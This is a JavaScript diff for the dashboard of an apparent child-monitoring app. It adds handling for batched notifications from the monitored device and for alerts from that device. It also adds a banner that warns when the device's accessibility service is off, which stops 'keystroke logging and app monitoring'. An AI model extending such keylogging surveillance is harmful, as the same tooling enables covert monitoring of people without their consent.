@@ -212,6 +212,22 @@ function handleRealtimeMessage(data) {
       handleInstantNotification(data.device_id, data.notification);
       break;
       
+    case 'child_notification_batch':
+      // BATCHED notifications from child (battery optimization)
+      console.log('[Sync] Batch of', data.count, 'notifications');
+      if (Array.isArray(data.notifications)) {
+        for (const notification of data.notifications) {
+          handleInstantNotification(data.device_id, notification);
+        }
+      }
+      break;
+      
+    case 'child_alert':
+      // Critical alert from child device (low battery, accessibility disabled, etc.)
+      console.warn('[Sync] Child alert:', data.alert_type, data.message);
+      handleChildAlert(data.device_id, data.alert_type, data.message, data.health);
+      break;
+      
     case 'location_update':
       // INSTANT location update
       console.log('[Sync] Real-time location:', data.location);
@@ -252,6 +268,68 @@ function handleRealtimeMessage(data) {
       }
       break;
   }
+}
+
+/**
+ * Handle critical alerts from child device (battery, accessibility, etc.)
+ */
+function handleChildAlert(deviceId, alertType, message, health) {
+  // Different icons/colors for different alert types
+  const alertStyles = {
+    'low_battery': { icon: '🔋', color: 'warning', priority: 'high' },
+    'accessibility_disabled': { icon: '⚠️', color: 'error', priority: 'critical' },
+    'connection_issues': { icon: '📶', color: 'warning', priority: 'medium' }
+  };
+  
+  const style = alertStyles[alertType] || { icon: '⚠️', color: 'warning', priority: 'medium' };
+  
+  // Show desktop notification for critical alerts
+  if (Notification.permission === 'granted') {
+    new Notification(`${style.icon} Child Device Alert`, {
+      body: message,
+      icon: '/icon.png',
+      tag: `alert-${alertType}-${deviceId}`,
+      requireInteraction: style.priority === 'critical'
+    });
+  }
+  
+  // Show in-app alert
+  showToast(`${style.icon} ${message}`, style.color, 10000);
+  
+  // Log to console for debugging
+  console.warn(`[Alert] ${alertType} on ${deviceId}:`, health);
+  
+  // If accessibility disabled, show prominent warning
+  if (alertType === 'accessibility_disabled') {
+    showAccessibilityWarning(deviceId);
+  }
+}
+
+/**
+ * Show prominent warning when accessibility service is disabled
+ */
+function showAccessibilityWarning(deviceId) {
+  // Check if warning already shown
+  if (document.getElementById('accessibility-warning')) return;
+  
+  const warning = document.createElement('div');
+  warning.id = 'accessibility-warning';
+  warning.className = 'fixed top-0 left-0 right-0 bg-red-600 text-white p-4 z-50 flex items-center justify-between';
+  warning.innerHTML = `
+    <div class="flex items-center">
+      <span class="text-2xl mr-3">⚠️</span>
+      <div>
+        <div class="font-bold">Accessibility Service Disabled</div>
+        <div class="text-sm">Keystroke logging and app monitoring are not working. The child may have disabled the service.</div>
+      </div>
+    </div>
+    <button onclick="this.parentElement.remove()" class="text-white hover:text-gray-200">
+      <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+      </svg>
+    </button>
+  `;
+  document.body.prepend(warning);
 }
 
 function handleInstantNotification(deviceId, notification) {
